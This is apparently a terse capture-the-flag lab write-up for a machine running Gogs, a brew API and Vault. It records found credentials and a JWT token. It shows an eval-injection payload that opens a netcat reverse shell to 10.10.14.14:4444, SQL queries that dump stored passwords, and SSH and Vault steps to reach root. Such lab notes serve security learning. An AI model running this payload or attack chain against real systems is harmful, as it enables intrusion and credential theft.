first we found 2 subdomains, in gogs subdomain we found api app, where we found credentials for authentificate 
![[Pasted image 20250209222651.png]]


dinesh:4aUh0A8PbVJxgd

we start logining in api app, /api/auth/login
and get JWT tokens:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzM5MTc0NTE2fQ.au6KkSfsPnXC2O3Yioc9u_FHkELxHV6AV_KDBXt0rTQ


we found vulnerable function in brew.py
![[Pasted image 20250210132122.png]]

so we download test.py script, and add import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
for disable invalid cerificate warnings
and add this command to get shell 
brew_dict['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4444 >/tmp/f')"
and run this script, we get access
in api shell we found credentials for mtsql database
/opt/app/craft_api/settings.py

MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'

then we download script /opt/app/dbtest.py
modify them, use this command: 
        sql = "SELECT GROUP_CONCAT(TABLE_NAME,TABLE_SCHEMA) from INFORMATION_SCHEMA.TABLES where t>
and download on api host
result:
![[Pasted image 20250211113130.png]]

next payload:
sql = "SELECT GROUP_CONCAT(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where table_name='user'"
result:
![[Pasted image 20250211113401.png]]

third payload:
sql = "SELECT GROUP_CONCAT(id,username,password) from craft.user"

result:
{'GROUP_CONCAT(id,username,password)': '1 dinesh 4aUh0A8PbVJxgd,4 ebachman llJ77D8QFkLPQB,5 gilfoyle ZEU3N8WNM2rh4T'}

we login into gogs with credentials gilfoyle ZEU3N8WNM2rh4T
and found .ssh folder with id_rsa
![[Pasted image 20250211120826.png]]
![[Pasted image 20250211120832.png]]
![[Pasted image 20250211120847.png]]
Enter passphrase for key 'id_rsa': ZEU3N8WNM2rh4T

we found .vault-token so we can try get access by using vault

we found secrets.sh in craft-infra
![[Pasted image 20250211151635.png]]
so we cat generate next command to get root access
vault ssh -role root_otp -mode otp root@10.10.10.110
 The SSH password is the OTP given by vault
 ![[Pasted image 20250211152928.png]]
 